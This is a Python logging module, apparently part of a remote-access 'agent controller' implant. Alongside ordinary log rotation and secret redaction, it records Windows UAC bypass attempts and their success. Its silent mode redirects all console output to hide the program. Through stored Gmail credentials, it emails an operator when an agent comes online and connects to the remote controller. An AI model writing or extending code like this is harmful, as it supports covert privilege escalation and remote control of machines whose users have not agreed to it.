"""
Logging utilities module - ENHANCED
Handles logging configuration and messaging for the agent
Enhanced with security event logging and sensitive data sanitization
"""

import logging
import logging.handlers
import io
import sys
import smtplib
import os
import re
import threading
import traceback
from datetime import datetime
from pathlib import Path
from typing import Optional, Any
from email.mime.text import MIMEText
from config import SILENT_MODE, DEBUG_MODE, EMAIL_NOTIFICATIONS_ENABLED, GMAIL_USERNAME, GMAIL_APP_PASSWORD, EMAIL_RECIPIENT, EMAIL_SENT_ONLINE

class SecureFormatter(logging.Formatter):
    """Custom formatter that sanitizes sensitive information"""
    
    SENSITIVE_PATTERNS = [
        'password', 'token', 'key', 'secret', 'auth', 'credential'
    ]
    
    def format(self, record: logging.LogRecord) -> str:
        """Format log record with sensitive data sanitization"""
        msg = super().format(record)
        
        # Sanitize sensitive information
        for pattern in self.SENSITIVE_PATTERNS:
            if pattern.lower() in msg.lower():
                # Replace sensitive values with asterisks
                msg = re.sub(
                    rf'{pattern}["\']?\s*[:=]\s*["\']?([^"\'\s,}}]+)',
                    rf'{pattern}=***',
                    msg,
                    flags=re.IGNORECASE
                )
        
        return msg

class EnhancedLoggingManager:
    """Enhanced logging manager with security features"""
    
    def __init__(self):
        self.logger = logging.getLogger("agent_controller")
        self._lock = threading.RLock()
        self._setup_logging()
        
    def _setup_logging(self) -> None:
        """Setup enhanced logging configuration"""
        # Clear existing handlers
        self.logger.handlers.clear()
        
        # Set level
        log_level = logging.INFO if DEBUG_MODE else logging.WARNING
        self.logger.setLevel(log_level)
        
        # Create formatters
        detailed_formatter = SecureFormatter(
            '%(asctime)s - %(name)s - %(levelname)s - %(module)s:%(lineno)d - %(message)s'
        )
        
        simple_formatter = SecureFormatter(
            '%(asctime)s - %(levelname)s - %(message)s'
        )
        
        if not SILENT_MODE:
            # Console handler
            console_handler = logging.StreamHandler(sys.stdout)
            console_handler.setLevel(log_level)
            console_handler.setFormatter(simple_formatter)
            self.logger.addHandler(console_handler)
        else:
            # Null handler for silent mode
            self.logger.addHandler(logging.NullHandler())
            # Redirect stdout and stderr
            sys.stdout = io.StringIO()
            sys.stderr = io.StringIO()
        
        # File handler with rotation
        try:
            log_dir = Path("logs")
            log_dir.mkdir(exist_ok=True)
            
            file_handler = logging.handlers.RotatingFileHandler(
                log_dir / "agent_controller.log",
                maxBytes=10*1024*1024,  # 10MB
                backupCount=5,
                encoding='utf-8'
            )
            file_handler.setLevel(logging.DEBUG)
            file_handler.setFormatter(detailed_formatter)
            self.logger.addHandler(file_handler)
            
        except Exception as e:
            if not SILENT_MODE:
                print(f"Warning: Could not setup file logging: {e}")
    
    def log_security_event(self, event: str, details: dict = None) -> None:
        """Log security-related events"""
        with self._lock:
            security_msg = f"[SECURITY] {event}"
            if details:
                # Sanitize details before logging
                sanitized_details = {k: "***" if any(p in k.lower() for p in SecureFormatter.SENSITIVE_PATTERNS) else v 
                                   for k, v in details.items()}
                security_msg += f" - Details: {sanitized_details}"
            
            self.logger.warning(security_msg)
    
    def log_uac_bypass_attempt(self, method: str, success: bool, error: Optional[str] = None) -> None:
        """Log UAC bypass attempts for monitoring"""
        with self._lock:
            status = "SUCCESS" if success else "FAILED"
            msg = f"[UAC_BYPASS] Method: {method} - Status: {status}"
            
            if error and not success:
                msg += f" - Error: {error}"
            
            if success:
                self.logger.warning(msg)  # Success is a warning-level security event
            else:
                self.logger.error(msg)
    
    def log_exception(self, message: str, exception: Exception) -> None:
        """Log an exception with full traceback"""
        with self._lock:
            exc_msg = f"{message}: {str(exception)}"
            self.logger.error(exc_msg, exc_info=True)
            
            # In debug mode, also print traceback to console
            if DEBUG_MODE and not SILENT_MODE:
                traceback.print_exc()

# Global enhanced logging manager
enhanced_logger = EnhancedLoggingManager()

def setup_silent_logging():
    """Setup enhanced logging system"""
    # Enhanced logging is already set up in EnhancedLoggingManager
    pass

def log_message(message, level="info"):
    """Enhanced log message with proper output handling and security features"""
    try:
        # Use enhanced logging manager
        if level.lower() == "error":
            enhanced_logger.logger.error(message)
        elif level.lower() == "warning":
            enhanced_logger.logger.warning(message)
        elif level.lower() == "debug":
            enhanced_logger.logger.debug(message)
        else:
            enhanced_logger.logger.info(message)
        
        # Also print to console if not in silent mode (for backward compatibility)
        if not SILENT_MODE:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            print(f"[{timestamp}] [{level.upper()}] {message}")
            
    except Exception as e:
        # Fallback to basic print if logging fails
        if not SILENT_MODE:
            print(f"[LOGGING ERROR] {e}: {message}")

def log_security_event(event: str, details: dict = None) -> None:
    """Log security events using enhanced logger"""
    enhanced_logger.log_security_event(event, details)

def log_uac_bypass_attempt(method: str, success: bool, error: Optional[str] = None) -> None:
    """Log UAC bypass attempts using enhanced logger"""
    enhanced_logger.log_uac_bypass_attempt(method, success, error)

def log_exception(message: str, exception: Exception) -> None:
    """Log exceptions using enhanced logger"""
    enhanced_logger.log_exception(message, exception)

def send_email_notification(subject: str, body: str) -> bool:
    """Send email notification using Gmail SMTP."""
    global EMAIL_SENT_ONLINE
    
    if not EMAIL_NOTIFICATIONS_ENABLED:
        return False
        
    if not all([GMAIL_USERNAME, GMAIL_APP_PASSWORD, EMAIL_RECIPIENT]):
        log_message("Email credentials not configured", "warning")
        return False
    
    try:
        msg = MIMEText(body)
        msg['Subject'] = subject
        msg['From'] = GMAIL_USERNAME
        msg['To'] = EMAIL_RECIPIENT
        
        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login(GMAIL_USERNAME, GMAIL_APP_PASSWORD)
            server.send_message(msg)
        
        log_message(f"Email notification sent: {subject}")
        EMAIL_SENT_ONLINE = True
        return True
        
    except Exception as e:
        log_message(f"Failed to send email notification: {e}", "error")
        return False

def notify_controller_client_only(agent_id: str):
    """Send notification when running as client only (no controller)"""
    subject = f"Agent {agent_id} Online"
    body = f"""
Agent ID: {agent_id}
Status: Connected (Client Mode)
Timestamp: {__import__('time').strftime('%Y-%m-%d %H:%M:%S')}

The agent is running in client-only mode and connected to the remote controller.
    """
    return send_email_notification(subject, body)

# Initialize silent logging immediately
setup_silent_logging()
